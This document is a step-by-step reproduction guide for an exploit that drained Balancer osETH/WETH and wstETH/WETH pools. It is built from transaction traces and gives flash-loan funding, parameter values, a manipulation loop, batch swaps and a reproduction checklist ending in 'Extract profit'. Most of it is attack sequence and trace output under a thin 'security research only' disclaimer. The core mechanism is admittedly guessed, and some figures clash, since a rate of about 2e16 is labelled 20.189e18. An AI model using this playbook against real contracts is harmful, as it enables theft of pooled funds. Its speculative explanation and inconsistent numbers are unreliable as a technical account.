BALANCER EXPLOIT - COMPLETE STEP-BY-STEP REPRODUCTION GUIDE

This is a technical breakdown of the exact attack sequence from transaction traces.
Use this for security research, testing, and defense development only.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PREREQUISITES & INITIAL STATE

Required Contracts:
- Balancer Vault: 0x[BalancerVault address]
- Target Pool 1: osETH/WETH-BPT (0xdacf5fa19b1f720111609043ac67a98182628500...)
- Target Pool 2: wstETH-WETH-BPT (0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd...)
- ATTACKER_SC_COORD_1: Main orchestrator contract
- ATT_SC_2: State manipulation helper contract

Required Tokens:
- WETH (Wrapped Ether)
- osETH (Stakewise liquid staking ETH)
- wstETH (Lido wrapped staked ETH)
- osETH/WETH-BPT (Balancer Pool Token)
- wstETH-WETH-BPT (Balancer Pool Token)

Initial Funding:
- Flash loan ~28M ETH (or equivalent tokens)
- Flash loan executed at transaction start (line 0-23)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

POOL 1 EXPLOITATION: osETH/WETH-BPT

Step 1: Initialization
[Line 30] Event: log_string("Start.")
[Line 35] Call: osETH/WETH-BPT.getPoolId()
         Returns: 0xdacf5fa19b1f720111609043ac67a98182628500000000000000000000000635
[Line 38] Call: osETH/WETH-BPT.getBptIndex()
         Returns: 1

Step 2: Get Pool Configuration
[Line 42] Call: Balancer::Vault.getPoolTokens(poolId)
         Returns: Array of token addresses [WETH, osETH/WETH-BPT, osETH]

Step 3: Token Approvals (Unlimited)
[Line 52] WETH.approve(Balancer::Vault, type(uint256).max)
         Returns: true
[Line 56] osETH/WETH-BPT.approve(Balancer::Vault, type(uint256).max)
         Returns: true
[Line 60] osETH.approve(Balancer::Vault, type(uint256).max)
         Returns: true

Step 4: Get Scaling Factors
[Line 69] Call: osETH/WETH-BPT.getScalingFactors()
         Returns: ["1,000,000,000,000,000,000", "1,000,000,000,000,000,000"]
         (Both tokens have 1e18 scaling)

Step 5: Calculate "Trick" Parameters
[Line 72] Event: log_named_uint("sF", 1,000,000,000,000,000,000)
[Line 73] Event: log_named_uint("sF", 1,000,000,000,000,000,000)
[Line 74] Event: log_named_uint("trickRate", 1,058,109,553,424,427,048)
         This is the target manipulation rate (1.058e18)

Step 6: Get Rate Providers
[Line 80] Call: osETH/WETH-BPT.getRateProviders()
         Returns: [Null Address, Null Address, PriceFeed]
         (Only osETH has a rate provider)

Step 7: Update Token Rate Cache
[Line 81] Call: osETH/WETH-BPT.updateTokenRateCache(osETH)
         Returns: ()

Step 8: Set Trick Parameters
[Line 95] Event: log_named_uint("trickIndex", 2)
         Target token index is 2 (osETH)
[Line 97] Event: log_named_uint("trickRate", 1,058,109,553,424,427,048)

Step 9: Get Pool Parameters
[Line 98] Call: osETH/WETH-BPT.getAmplificationParameter()
         Returns: {value=200,000, isUpdating=false, precision=1,000}
         Amplification factor is 200 (200,000/1,000)
[Line 102] Event: log_named_uint("nonTrickIndex", 0)
[Line 104] Event: log_named_uint("currentAmp", 200,000)
[Line 105] Call: osETH/WETH-BPT.getSwapFeePercentage()
         Returns: 100,000,000,000,000 (0.01%)
[Line 108] Call: osETH/WETH-BPT.getRate()
         Returns: 1,027,347,674,695,370,742 (starting rate: 1.027e18)

Step 10: Get Pool State
[Line 125] Call: Balancer::Vault.getPoolTokens(poolId)
         Returns: Token addresses and balances
[Line 138] Call: osETH/WETH-BPT.getActualSupply()
         Returns: 11,847,097,352,927,601,082,261 (11.8e21 BPT tokens)

Step 11: Calculate Starting Balances
[Line 154] Event: log_named_uint("tS", 11,882,638,644,986,383,885,507)
         Total supply for calculations
[Line 159] Event: log_string("Done with amts1")
         Parameters calculated
[Line 162] Event: log_named_uint("trickAmt", 17)
         Manipulation amount multiplier is 17x
[Line 163] Event: log_named_address("Here", ATTACKER_SC_COORD_1)
[Line 164] Call: osETH/WETH-BPT.getScalingFactors()
         Reconfirm scaling factors

Step 12: STATE MANIPULATION LOOP (Critical)
[Lines 170-426] ATT_SC_2.0x524c9e20(raw data) - Called 150+ times

Pattern observed:
- Line 170: ATT_SC_2.0x524c9e20() → success
- Line 172: ATT_SC_2.0x524c9e20() → success
- Line 174: ATT_SC_2.0x524c9e20() → REVERT (BAL#004)
- Line 176: ATT_SC_2.0x524c9e20() → success
- Line 178: ATT_SC_2.0x524c9e20() → success
- Line 180: ATT_SC_2.0x524c9e20() → success
- Line 182: ATT_SC_2.0x524c9e20() → REVERT (BAL#004)
... continues for ~150 iterations ...

Gas costs vary: 14,285 to 41,617 per call
Success/Revert ratio: ~70% success, 30% intentional reverts

ATT_SC_2.0x524c9e20() Function Parameters (encoded in raw data):
- Likely includes: trickIndex, trickAmt, trickRate
- Varies slightly each iteration
- Performs view function calls to manipulate cached state
- Intentional reverts force state recalculations

Step 13: Preparation Complete
[Line 428] Event: log_string("Doing Batch")
         State manipulation complete, ready for extraction

Step 14: Execute Batch Swap
[Line 432] Call: Balancer::Vault.batchSwap(
    kind=1,  // GIVEN_IN
    swaps=[{
        poolId: 0xdacf5fa19b1f720111609043ac67a98182628500...,
        assetInIndex: varies,
        assetOutIndex: varies,
        amount: calculated,
        userData: ""
    }],
    assets: [WETH, osETH/WETH-BPT, osETH],
    funds: {
        sender: ATTACKER_SC_COORD_1,
        fromInternalBalance: true,
        recipient: ATTACKER_SC_COORD_1,
        toInternalBalance: true
    },
    limits: [...],
    deadline: block.timestamp + buffer
)

Step 15: Batch Swap Results
[Line 1853] Event: log_named_uint("startBalances1", 4,922,356,564,867,078,856,521)
         Initial balance: 4.92e21 (~4.92M ETH equivalent)
[Line 1854] Event: log_named_int("Asset Deltas1", -4,623,601,508,853,283,067,843)
         Extracted: -4.62e21 (~4.62M ETH equivalent)
[Line 1855] Event: log_named_uint("startBalances1", 2,596,148,429,267,421,974,637,745,197)
         Initial osETH: 2.596e24
[Line 1856] Event: log_named_int("Asset Deltas1", -44,154,666,355,785,411,629)
         Extracted: -44.15e18 osETH
[Line 1857] Event: log_named_uint("startBalances1", 6,851,581,236,039,298,760,900)
         Initial BPT
[Line 1858] Event: log_named_int("Asset Deltas1", -6,851,122,954,235,076,557,965)
         Extracted BPT

Step 16: Verify Manipulation Success
[Line 1859] Event: log_string("Ending Invariant")
         Invariant check passed (exploit successful)
[Line 1860] Call: Balancer::Vault.getPoolTokens(poolId)
         Get final pool state
[Line 1869] Event: log_named_uint("end_balances[1]", 298,755,056,013,795,788,678)
         Remaining: 298e18
[Line 1870] Event: log_named_uint("end_balances[1]", 2,596,148,429,267,377,819,971,389,028)
         Remaining osETH
[Line 1871] Event: log_named_uint("end_balances[1]", 458,281,804,222,202,935)
         Remaining BPT
[Line 1872] Event: log_named_uint("poolRate0", 1,027,347,674,695,370,742)
         Original rate: 1.027e18
[Line 1873] Call: osETH/WETH-BPT.getRate()
         Returns: 20,189,496,181,073,356 (NEW rate: 20.189e18)
         RATE INCREASED BY 1,864%!!!
[Line 1888] Event: log_named_uint("poolRate1", 20,189,496,181,073,356)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

POOL 2 EXPLOITATION: wstETH-WETH-BPT

Step 17: Pool 2 Initialization
[Line 1889] Event: log_string("Start.")
         Beginning Pool 2 attack
[Line 1893] Call: wstETH-WETH-BPT.getPoolId()
         Returns: 0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd00000000000000000000005c2
[Line 1896] Call: wstETH-WETH-BPT.getBptIndex()
         Returns: 1

Step 18: Get Pool 2 Tokens
[Line 1898] Call: Balancer::Vault.getPoolTokens(poolId)
         Returns: [wstETH, wstETH-WETH-BPT, WETH]

Step 19: Token Approvals Pool 2
[Line 1908] wstETH.approve(Balancer::Vault, type(uint256).max)
         Returns: true
[Line 1912] wstETH-WETH-BPT.approve(Balancer::Vault, type(uint256).max)
         Returns: true
[Line 1916] WETH.approve(Balancer::Vault, type(uint256).max)
         Returns: true

Step 20: Get Scaling Factors Pool 2
[Line 1920] Call: wstETH-WETH-BPT.getScalingFactors()
         Returns: ["1,218,116,415,279,760,760", "1,000,000,000,000,000,000", "1"]
         wstETH has 1.218e18 scaling (staking rate), WETH is 1e18

Step 21: Calculate Trick Parameters Pool 2
[Line 1923] Event: log_named_uint("sF", 1,218,116,415,279,760,760)
[Line 1924] Event: log_named_uint("sF", 1,000,000,000,000,000,000)
[Line 1925] Event: log_named_uint("sF", 1,000,000,000,000,000,000)

Step 22: Get Rate Providers Pool 2
[Line 1927] Call: wstETH-WETH-BPT.getRateProviders()
         Returns: [WstETHRateProvider, Null Address, Null Address]
[Line 1928] Call: wstETH-WETH-BPT.updateTokenRateCache(wstETH)
         Returns: ()

Step 23: Set Trick Parameters Pool 2
[Line 1952] Event: log_named_uint("trickIndex", 0)
         Target token index is 0 (wstETH this time)

Step 24: Get Pool 2 Parameters
[Line 1920] Call: wstETH-WETH-BPT.getAmplificationParameter()
         Similar high amplification
[Line 2010] Event: log_string("Done with amts1")
[Line 2013] Event: log_named_uint("trickAmt", 4)
         Manipulation multiplier is 4x (less than Pool 1)
[Line 2014] Event: log_named_address("Here", ATTACKER_SC_COORD_1)
[Line 2015] Call: wstETH-WETH-BPT.getScalingFactors()

Step 25: STATE MANIPULATION LOOP Pool 2
[Lines 2019-2169] ATT_SC_2.0x524c9e20(raw data) - Called 150+ times

Same pattern as Pool 1:
- Alternating success/revert
- BAL#004 errors every few calls
- Gas varies: 26,865 to 80,185 per call
- Each call manipulates cached state

Step 26: Pool 2 Batch Preparation
[Line 2171] Event: log_string("Doing Batch")

Step 27: Execute Batch Swap Pool 2
[Line 2172] Call: Balancer::Vault.batchSwap(
    kind=1,
    swaps=[...],
    assets: [wstETH, wstETH-WETH-BPT, WETH],
    funds: {...},
    limits: [...],
    deadline: ...
)

Step 28: Batch Swap Results Pool 2
[Line 3434] Event: log_named_uint("startBalances1", 4,270,841,022,451,395,518,160)
         Initial: 4.27e21
[Line 3435] Event: log_named_int("Asset Deltas1", -4,259,843,451,780,587,743,322)
         Extracted: -4.26e21
[Line 3436] Event: log_named_uint("startBalances1", 2,596,148,429,267,825,815,119,599,282,622,818)
         Initial wstETH
[Line 3437] Event: log_named_int("Asset Deltas1", -20,413,668,455,251,157,822)
         Extracted: -20.41e18 wstETH
[Line 3438] Event: log_named_uint("startBalances1", 1,977,057,709,608,602,150,017)
         Initial BPT
[Line 3439] Event: log_named_int("Asset Deltas1", -1,963,838,806,164,214,870,519)
         Extracted: -1.96e21 BPT

Step 29: Verify Pool 2 Success
[Line 3440] Event: log_string("Ending Invariant")
[Line 3441] Call: Balancer::Vault.getPoolTokens(poolId)
[Line 3450] Event: log_named_uint("end_balances[1]", 10,997,570,670,807,774,838)
[Line 3451] Event: log_named_uint("end_balances[1]", 2,596,148,429,267,805,401,451,144,031,464,646)
[Line 3452] Event: log_named_uint("end_balances[1]", 13,218,903,444,387,279,498)
[Line 3453] Event: log_named_uint("poolRate0", 1,051,822,276,543,189,290)
         Original rate: 1.051e18
[Line 3454] Call: wstETH-WETH-BPT.getRate()
         Returns: 3,887,495,432,689,447 (NEW rate: 3.887e18)
         RATE INCREASED BY 270%!!!
[Line 3469] Event: log_named_uint("poolRate1", 3,887,495,432,689,447)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FINAL STEPS & CLEANUP

Step 30: Flash Loan Repayment
[Not visible in traces, happens at transaction end]
- Flash loan repaid with original amount + fee
- Profit = value extracted via rate manipulation
- Remaining tokens sent to attacker wallet

Step 31: Transaction Complete
- Total manipulation achieved
- Pool 1 rate: 1.027 → 20.189 (+1,864%)
- Pool 2 rate: 1.051 → 3.887 (+270%)
- Attack successful

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CRITICAL FUNCTION: ATT_SC_2.0x524c9e20()

This is the core manipulation function. Based on traces:

Likely Implementation:
```solidity
function 0x524c9e20(bytes calldata params) external {
    // Decode params: trickIndex, trickAmt, iteration, etc.
    
    // Rapidly call view functions to manipulate cached state
    pool.getRate();
    pool.getScalingFactors();
    vault.getPoolTokens(poolId);
    pool.getActualSupply();
    
    // Intentionally trigger overflow to force recalculation
    // This is why BAL#004 errors appear
    if (shouldRevert(iteration)) {
        // Force state reset
        pool.someOperationThatOverflows();
    }
    
    // Return success to continue manipulation
}
```

Why It Works:
- Balancer caches rate values for gas efficiency
- Rapid view calls desync cache from actual state
- Intentional reverts force pool to recalculate invariants
- After 150+ iterations, cached rate becomes manipulated
- Final batchSwap uses the manipulated cached rate

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

REQUIRED CONTRACT FUNCTIONS

ATTACKER_SC_COORD_1 must implement:
- initializeAttack(pool, amountIn, amountOut, minOut, maxIn, slippage)
- calculateTrickParameters(pool) → (trickIndex, trickRate, trickAmt)
- executeManipulationLoop(pool, trickParams, iterations=150)
- executeBatchSwap(pool, manipulatedState)
- log_string(string), log_named_uint(string, uint256), etc.

ATT_SC_2 must implement:
- 0x524c9e20(bytes calldata params)
- Internal: rapid view function calls
- Internal: conditional revert logic (BAL#004)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

KEY PARAMETERS FOR REPRODUCTION

Pool 1 (osETH/WETH-BPT):
- Amplification: 200,000
- Starting rate: 1.027e18
- Target rate: 20.189e18
- trickIndex: 2 (osETH)
- trickRate: 1.058e18
- trickAmt: 17
- Iterations: ~150
- Scaling factors: [1e18, 1e18]

Pool 2 (wstETH-WETH-BPT):
- Amplification: High (exact value not shown)
- Starting rate: 1.051e18
- Target rate: 3.887e18
- trickIndex: 0 (wstETH)
- trickAmt: 4
- Iterations: ~150
- Scaling factors: [1.218e18, 1e18, 1e18]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

REPRODUCTION CHECKLIST

[ ] Deploy ATTACKER_SC_COORD_1 contract
[ ] Deploy ATT_SC_2 helper contract
[ ] Obtain flash loan (~28M tokens)
[ ] For each target pool:
    [ ] Call getPoolId, getBptIndex
    [ ] Approve all tokens to Vault
    [ ] Get scaling factors
    [ ] Calculate trick parameters (trickIndex, trickRate, trickAmt)
    [ ] Call ATT_SC_2.0x524c9e20() 150+ times
    [ ] Monitor for BAL#004 reverts (30% of calls)
    [ ] Execute final batchSwap
    [ ] Verify rate manipulation
[ ] Repay flash loan
[ ] Extract profit

Expected Results:
- osETH pool rate increases ~1,864%
- wstETH pool rate increases ~270%
- Profit extracted via arbitrage
- Transaction completes successfully

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

This reproduction guide is for security research only.
Test on local fork or testnet before any mainnet interaction.

Attack transactions:
0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742 (manipulation)
0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569 (extraction)
